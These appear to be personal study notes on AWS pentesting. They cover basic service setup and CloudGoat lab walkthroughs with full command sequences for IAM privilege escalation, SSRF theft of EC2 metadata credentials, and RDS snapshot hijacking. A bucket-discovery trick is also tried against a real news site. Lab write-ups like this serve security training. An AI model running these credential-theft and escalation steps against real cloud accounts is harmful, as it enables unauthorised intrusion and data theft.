AWS Pentesting
-----------------


IAM
----------
*IAM policies can be applied to Users,Groups and Roles
*Roles can be assigned Resources (ec2,s3 etc)
a)Users : create user -> create group -> assign a group(select a policy(permissions))
b)Roles :  create role -> select a policy(permissions)


EC-2 instance
-------------
create keypairs
1.create an instance using free tier AMI
2.Create and assign security group (inbound/outbound rules)
3.Launch the instance
4.Connect to the instance 
chmod 400 key-pair.pem

ssh -i /path/my-key-pair.pem ec2-user@ec2-198-51-100-1.compute-1.amazonaws.com

4.Edit security group rules(inbound and outbound)

username:ec2-user


*Can add IAM role in settings


Runnning a httpd server and hosting index.html (enable http on inbound rules)

1.sudo chkconfig httpd on - use the chkconfig command to configure the Apache web server to start at each system boot. 

http://ec2-3-80-245-140.compute-1.amazonaws.com/ :for accessing the hosted site

Misconfigured buckets
-------------------------
1.Created bucket (https://console.aws.amazon.com/s3/)
 bucketname:cloudgoat
 *uploaded a file

file url:
 https://cloudgoat.s3.ap-south-1.amazonaws.com/28352307-digital-encryption-lock-conceptual-illustration-data-safety-in-it-technology-.jpg

url format;
---------------
<Bucket_Name>.s3.amazonaws.com
ex:
cloudgoat.s3.amazonaws.com

https://581767453859.signin.aws.amazon.com/console


list bucket
-------------
aws s3 ls s3://cloudgoat --recursive

move files to bucket
--------------------
aws s3 mv test.txt s3://bucket


delete files
---------------
aws s3 rm s3://mybucket/test2.txt

copy files
------------
aws s3 cp file.txt s3://my-bucket/

download files
-------------
aws s3 sync s3://site-code-cred /home/we45/Desktop/src_down --profile ec2-usr

https://cloudgoat.s3.ap-south-1.amazonaws.com/index.html

Static website hosting:
http://cloudgoat.s3-website.ap-south-1.amazonaws.com/

KMS(Key Management Services)
-----------------------------
1.create KMS encryption key
2.assign aws-kms key for s3 bucket 
region of both KMS and Resource(s3 bucket) should be same.


Cloudfront - web caching for aws
---------------------------------
1.Select distribution-web
2.Choose origin (s3 bucket name) ex:cloudgoat.s3.amazonaws.com
3.Provide Alternate Domain Names (CNAMEs)  ex:site.com
4.choose SSL certificate options,logging options etc.
5.Create distribution 

so we will get the cloudfront domain like d2l0lkoh6qlzfk.cloudfront.net

route53 - dns config for aws
------------------------------
DNS management
1.create host zone
2.Provide domain name and type

will have the name records for that host zone.

3.Assign this name servers in your hosting site customized ns records.


RDS(Mysql)
----------
1.create db -> choose db engine(mysql)
2.Choose db version(5.7.22)
3.choose template(free tier)
4.Fill settings fields like enter sbid,db username,password etc
5.Choose additional options like publicaly accessible ,etc.
6.Create database

we will get an endpoint like testdb.clbskhcjgr8h.us-east-1.rds.amazonaws.com

for accessing the db:
mysql -h testdb.clbskhcjgr8h.us-east-1.rds.amazonaws.com -P 3306 -u admin -p


Cloud trail
------------
*Log service

1.Create trail
fill details like trailname,choose S3 buckets to be logged,choose storage location(s3 bucket)

2.Check the logs in the bucket that you have created for log trail (based on the region.for india(Mumbai) it will be 'ap-south-1')




Cloud Watch
------------
Monitoring tool

*metrics
*alarms
*events

Creating Alarms for various events like CPUutilization of ec2 instance - using SNS (Simple Notification Service)

->enter details like alarm name,topic name etc

SNS - create a topic and add subscription



SSM(Systems Management)
------------------------
Used to handle ec2 instances - by running commands on instance

required:
assign ssm role(ex policy:AmazonEC2RoleforSSM ) to the instance

1.open ssm-> choose 'run command' -> select a command document (ex:RunShellScript) ->select a target(instance) ->enter commands(apt get install httpd)
->Run

2. After completion of the command execution,we can check the output.


CodeBuild
-----------

*A developer uses the service to compile, test and deploy source code as build projects


create a build project -> provide project name--> select source(code commit,github,S3 etc) --> choose images(ubuntu,windows etc) -->choose runtime(java,php,node js,python etc)  -> choose run time version ->choose buildspec file -> choose artifact option like output directory(s3 bucket),zip etc(output to be produced etc .jar file) ->create project 
-->start build (build the output)

-------------------


Recon
-------------

To find a s3 bucket of a domain;
-----------------------------------
1.add the %C0 url-encoded 

EX:https://timesofindia.indiatimes.com/india/live-updates-narendra-modi-and-china-president-xi-jinping-chennai-visit/liveblog/71533346.cms/%C0

re:  <Error><Code>InvalidURI</Code><Message>Couldn't parse the specified URI.</Message>
<URI>/toiassets/liveblog/msid-%C0</URI>  toiassets-bucketname
<RequestId>B962AB8BB6E7A38E</RequestId><HostId>Iq5DkUJ5bCrtLZ49Q4ibEFyuTsJdkqMJhPoKtyx8hLGJ1r9582tfEoxcKBK5xNA2mLEmmxmSvc0=</HostId></Error>

2.Add the ?torrent query string parameter at the end of the object.
  \?torrent

3.fqdn
----------
ex.example.com, so we can try to check if it exists or not:

bucket name will be:ex.example.com.s3.amazonaws.com



ACL of an obj
-----------------

The following command retrieves the access control list for an object in a bucket named my-bucket:

aws s3api get-object-acl --bucket my-bucket --key index.htm


Cloudgoat
-----------

Scenario: iam_privesc_by_rollback
-----------------------------------

vulnerability:restore the full admin privilege policy version

list-attached-user-policies: show the customer managed policies. Versioning can only be done on customer managed policies.

1.aws configure --profile raynor (add profile 'raynor' to aws credentials file)
2.aws iam list-attached-user-policies --user-name raynor --profile raynor (display attached user polices of user 'raynor')
3.review the policies and find the one with full privilege
aws iam get-policy-version --policy-arn arn:aws:iam::581767453859:policy/cg-raynor-policy --version-id  v2  --profile raynor
4.Set the V2 policy with set-default-policy-version command


scenario 2:iam_privesc_by_attachment
---------------------------------------------------
vuln:Delete the EC2 instance "cg-super-critical-security-server."

user:kerrigan
ec-2 instance: CloudGoat cgidn6bul7l2y7 super-critical-security-server EC2 Instance

1./cloudgoat.py create iam_privesc_by_attachment --profile cloudgoat
2.aws ec2 describe-instances --profile kerrigan

(detailed description of ec2 instance like imagename,security group,iam profile etc.)

the current user cannot start/stop/terminate the instance.
ec2 stop-instances instance-id --profile kerrigan (An error occurred (UnauthorizedOperation)) 


3.aws iam list-instance-profiles --profile kerrigan (it list ec2-roles(instance profile) in the account)
current role:"RoleName": "cg-ec2-meek-role-cgid4b3c3uznd2",(which has less privileage)
cg-ec2-meek-instance-profile-cgid4b3c3uznd2 (instance profile name)

4.aws iam list-roles --profile kerrigan (list all roles in the account )

we found another role 'cg-ec2-mighty-role-cgid4b3c3uznd2'

5.assign this role to the instance-profile  'cg-ec2-meek-instance-profile-cgid4b3c3uznd2'

a.remove old role from the instance profile:
aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-cgid4b3c3uznd2 --role-name cg-ec2-meek-role-cgid4b3c3uznd2 --profile kerrigan
 
 b.add role to the instance profile:
 aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-cgid4b3c3uznd2 --role-name cg-ec2-mighty-role-cgid4b3c3uznd2 --profile kerrigan

6.crate a key-pair

aws ec2 create-key-pair --key-name kerrigan  --output text > kerrigan1.pem --profile kerrigan 

aws ec2 create-key-pair --key-name thetestlabs  --query 'KeyMaterial' --output text > thetestlabs.pem --region us-east-1



"InstanceProfileName": "cg-ec2-meek-instance-profile-cgid4b3c3uznd2",
            "InstanceProfileId": "AIPAYO5AK3SR5EFGQ7S46",
            "Arn": "arn:aws:iam::581767453859:instance-profile/cg-ec2-meek-instance-profile-cgid4b3c3uznd2"

7.run the instance 

aws ec2 run-instances --image-id ami-0a313d6098716f372 --iam-instance-profile Arn=arn:aws:iam::581767453859:instance-profile/cg-ec2-meek-instance-profile-cgid4b3c3uznd2 --key-name kerrigan --profile kerrigan --subnet-id subnet-03d12e0ce67db1176 --security-group-ids sg-06f11af146c12d5ad 


8.access 

ssh -i /path/my-key-pair.pem ec2-user@ec2-198-51-100-1.compute-1.amazonaws.com




scenario 3:Cloud breach s3 (Misconfigured reverse proxy)
--------------------------------

goal:download sensitive files from s3 which requires high privilege

cloudgoat_output_aws_account_id = 581767453859
cloudgoat_output_target_ec2_server_ip = 3.87.202.96


the url format of ec2 instance will be:

http://ec2-0-0-0-0.compute-1.amazonaws.com

ex:
http://ec2-3-87-202-96.compute-1.amazonaws.com
try to access the ec2 ip:


Enumerating the metadata service
--------------------------
To view all categories of instance metadata from within a running instance, use the following URI:

http://169.254.169.254/latest/meta-data/

169.254.169.254 - link local address

But we have no access to that ec2 instance.

1.curl http://3.87.202.96/latest/meta-data -H 'Host:169.254.169.254'

curl http://3.87.202.96/latest/meta-data/ami-id -H 'Host:169.254.169.254' -to find the ami id

2.curl http://3.87.202.96/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'  ---find the roles
cg-banking-WAF-Role-cgidaun8xri8rf

3.curl http://3.87.202.96/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgidaun8xri8rf -H 'Host:169.254.169.254' --get the credentials


  

4.setup the aws account using the credentials and acces Token
aws configure --profile rever


to check the temporary credentials:
aws sts get-caller-identity --profile example

5.aws s3 ls --profile rever

list the buckets  


list files
aws s3 ls s3://cg-cardholder-data-bucket-cgidaun8xri8rf --profile rever

6. aws s3 sync s3://cg-cardholder-data-bucket-cgidaun8xri8rf /home/we45/Desktop/aws-pentest  --profile rever   (download files)

reference:
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html




Scenario - 4 ec2-ssrf
----------------------
goal:Invoke the "cg-lambda-cgidogfic0xrh1" Lambda function.

a.Lambda function-ec2-s3 
*./cloudgoat.py create ec2_ssrf --profile cloudgoat
b.aws configure --profile solus


1.aws lambda list-functions --profile solus (list the lambda functions and find the creds)

  
2.Create a profile "ec2" with this credentials

3.aws ec2 describe-instances --profile ec2  (list the instances details and find the target ec2 instance)

ImageId": "ami-0a313d6098716f372",
"InstanceId": "i-071bbd694b865e2af",
"PublicDnsName": "ec2-34-205-62-90.compute-1.amazonaws.com",
"PublicIpAddress": "34.205.62.90",

4.curl http://ec2-34-205-62-90.compute-1.amazonaws.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ (get credentials through aws metadata services by exploit ssrf vulnerable web app hosted in ec2 instance)


found the role : cg-ec2-role-cgidogfic0xrh1, now get the credentials

5.curl http://ec2-34-205-62-90.compute-1.amazonaws.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidogfic0xrh1
            
  
6.Configure a profile with these ec2-role credentials and find the aws creds from sensitive bucket

            a.aws configure --profile lambda

            b.aws s3 ls --profile lambda
                     
                     o/p:cg-secret-s3-bucket-cgidogfic0xrh1

            list the files in the bucket 'cg-secret-s3-bucket-cgidogfic0xrh1'

            c.aws s3 ls s3://cg-secret-s3-bucket-cgidogfic0xrh1 --profile lambda

               o/p:62 admin-user.txt
            d. download or copy the files 
            aws s3 sync s3://cg-secret-s3-bucket-cgidogfic0xrh1/  /home/we45/Desktop/aws-pentest --profile lambda
              
  7. configure another [profile] lambda2 with this credentials

          aws configure --profile lambda

          a.list the lambda functions 
                 
           aws lambda list-functions --profile lambda2
           

           o/p: testfunction and cg-lambda-cgidogfic0xrh1

          access the lambda function cg-lambda-cgidogfic0xrh1

          b.aws lambda invoke --function-name cg-lambda-cgidogfic0xrh1 /home/we45/Desktop/aws-pentest/test_out.txt --profile lambda2




Scenario - 5 rce - webapp
---------------------------



goal:access the rds psql db.

solution-1
------------
configure profile mcduck 

1.list and download ssh keys

aws s3 sync s3://cg-keystore-s3-bucket-cgidmmw80ogwsz /home/we45/Desktop/aws-pentest  --profile mcduck

2.Describe ec2 instances :

 "PublicDnsName": "ec2-3-93-15-102.compute-1.amazonaws.com",
 "PublicIpAddress": "3.93.15.102"

3. give permission to the private key
   chmod 400 cloudgoat

4. Access the instance:
ssh -i cloudgoat ubuntu@ec2-3-93-15-102.compute-1.amazonaws.com

5. install awscli in the instance and list buckets


download the sensitive data:
aws s3 sync s3://cg-secret-s3-bucket-cgidmmw80ogwsz /home/ubuntu/data

will get the db credentials:

DB name: cloudgoat
Username: cgadmin
Password: Purplepwny2029

6.List rds db instances:

 aws rds describe-db-instances --region us-east-1

 it is foun that the db is postgresql
            "DBInstanceIdentifier": "cg-rds-instance-cgidmmw80ogwsz",
            "DBInstanceClass": "db.t2.micro",
            "Engine": "postgres",
            "DBInstanceStatus": "available",
            "MasterUsername": "cgadmin",
            "DBName": "cloudgoat",
            "Endpoint": {
                "Address": "cg-rds-instance-cgidmmw80ogwsz.clbskhcjgr8h.us-east-1.rds.amazonaws.com",
                "Port": 5432,
             
7. Connect to the postgresql

psql -h cg-rds-instance-cgidmmw80ogwsz.clbskhcjgr8h.us-east-1.rds.amazonaws.com -p 5432 -d cloudgoat -U cgadmin

will get the psql prompt:

*\dt - display all tables

select * from sensitive_information;


summary
--------
1.get the ec2 instance's private key from the s3 bucket
2.connect to ec2 instance using the key
3.get the credential for rds db
4.access the db using the creds.


solution-2
-------------

1.configure profile lara
2.list and download log file stored in the s3 bucket
aws s3 sync s3://cg-logs-s3-bucket-cgidmmw80ogwsz /home/we45/Desktop/aws-pentest  --profile lara

3.review the log file
cat 555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log
 
found the loadbalancer entity.

4.list the loadbalancer

aws elbv2 describe-load-balancers --profile lara

found the endpoint:
 "DNSName": "cg-lb-cgidmmw80ogwsz-575732128.us-east-1.elb.amazonaws.com",
secret endpoint:
 http://cg-lb-cgidmmw80ogwsz-575732128.us-east-1.elb.amazonaws.com/mkja1xijqf0abo1h9glg.html


5.Access the end point and enter the command in the vulnerable input field:

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

o/p:role: cg-ec2-role-cgidaexmea6mz6

6.Enter the command for fetching the credentials

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidaexmea6mz6



7.configure a new profile with this creds and download the db creds drom the bucket;
    
    aws configure --profile laran
    aws s3 ls --profile  laran
    aws s3 ls s3://cg-secret-s3-bucket-cgidaexmea6mz6 --profile  laran
    aws s3 sync s3://cg-secret-s3-bucket-cgidaexmea6mz6 /home/we45/Desktop/aws-pentest/dbcred --profile  laran

8. Find rds instances and connect with the db using creds fetched previously.

aws rds describe-db-instances --profile laran


            "DBInstanceIdentifier": "cg-rds-instance-cgidaexmea6mz6",
            "DBInstanceClass": "db.t2.micro",
            "Engine": "postgres",
            "DBInstanceStatus": "available",
            "MasterUsername": "cgadmin",
            "DBName": "cloudgoat",
            "Endpoint": {
                "Address": "cg-rds-instance-cgidaexmea6mz6.clbskhcjgr8h.us-east-1.rds.amazonaws.com",
                "Port": 5432,
                "HostedZoneId": "Z2R2ITUGPM61AM"
            
9. For connecting this psql db:

psql -h cg-rds-instance-cgidmmw80ogwsz.clbskhcjgr8h.us-east-1.rds.amazonaws.com -p 5432 -d cloudgoat -U cgadmin

will get the psql prompt:

*\dt - display all tables

select * from sensitive_information;




scenario-6: codebuild project secrets
-------------------------------------
Goal: A pair of secret strings stored in a secure RDS database.



1.aws codebuild  list-projects --profile solo (list codebuild projects)


    cg-codebuild-cgiderpb1p6orv

2. aws codebuild batch-get-projects --names cg-codebuild-cgiderpb1p6orv --profile solo (Find the credentials stored in environment variables:)

	

3.configure the profile calriss :



4.aws rds describe-db-instances --profile calriss
               
           cg-rds-instance-cgidp204zbtpcb




5.aws rds create-db-snapshot --db-instance-identifier cg-rds-instance-cgidp204zbtpcb --db-snapshot-identifier cloudgoat --region us-east-1 --profile calriss


   "DBSnapshotIdentifier": "cloudgoat",
        "DBInstanceIdentifier": "cg-rds-instance-cgidp204zbtpcb",
        "Engine": "postgres",
        "Port": 5432,
        "AvailabilityZone": "us-east-1b",
        "VpcId": "vpc-0ebf607c1c7ac1d2c",
        "MasterUsername": "cgadmin",
        "DBSnapshotArn": "arn:aws:rds:us-east-1:581767453859:snapshot:cloudgoat",
        

6.aws rds describe-db-subnet-groups --region us-east-1 --profile calriss

 cloud-goat-rds-testing-subnet-group-cgidp204zbtpcb

aws ec2 describe-security-groups --region us-east-1 --profile calriss
      
      sg-0b7909d7a6e0c2491

  

7. aws rds restore-db-instance-from-db-snapshot --db-instance-identifier cloudgoat --db-snapshot-identifier arn:aws:rds:us-east-1:581767453859:snapshot:cloudgoat --db-subnet-group-name cloud-goat-rds-testing-subnet-group-cgidp204zbtpcb --publicly-accessible --vpc-security-group-ids sg-0b7909d7a6e0c2491 --region us-east-1



8.aws rds modify-db-instance --db-instance-identifier cloudgoat --master-user-password cloudgoat --region us-east-1

"DBInstanceIdentifier": "cloudgoat",
        "DBInstanceClass": "db.t2.micro",
        "Engine": "postgres",
        
        "MasterUsername": "cgadmin",
        "DBName": "securedb",
        "Endpoint": {
            "Address": "cloudgoat.clbskhcjgr8h.us-east-1.rds.amazonaws.com",
            "Port": 5432,



9. connect to the db
psql -h cloudgoat.clbskhcjgr8h.us-east-1.rds.amazonaws.com -p 5432 -d securedb -U cgadmin


/dt

select  * from sensitive_information;

reference:
------------
1.https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios
2.https://thetestlabs.io




php ec2 ssr
------------
build the code

goal:access the s3 bucket and download the source code

1.Find out the rolename associalted with the instance
  

curl http://ec2-34-228-238-206.compute-1.amazonaws.com/?site=http://169.254.169.254/latest/meta-data/iam/security-credentials/

ec2_s3

2. Find out the temporary security credentials associated with the role

curl http://ec2-34-228-238-206.compute-1.amazonaws.com/?site=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_s3



aws sts get-caller-identity --profile example --for checking the temporary credentials

3.configure profile with this credentials
    aws configure 

4.List and download files in the s3 bucket:

  aws s3 ls --profile ec2-usr
  aws s3 sync s3://site-code-cred /home/we45/Desktop/src_down --profile ec2-usr
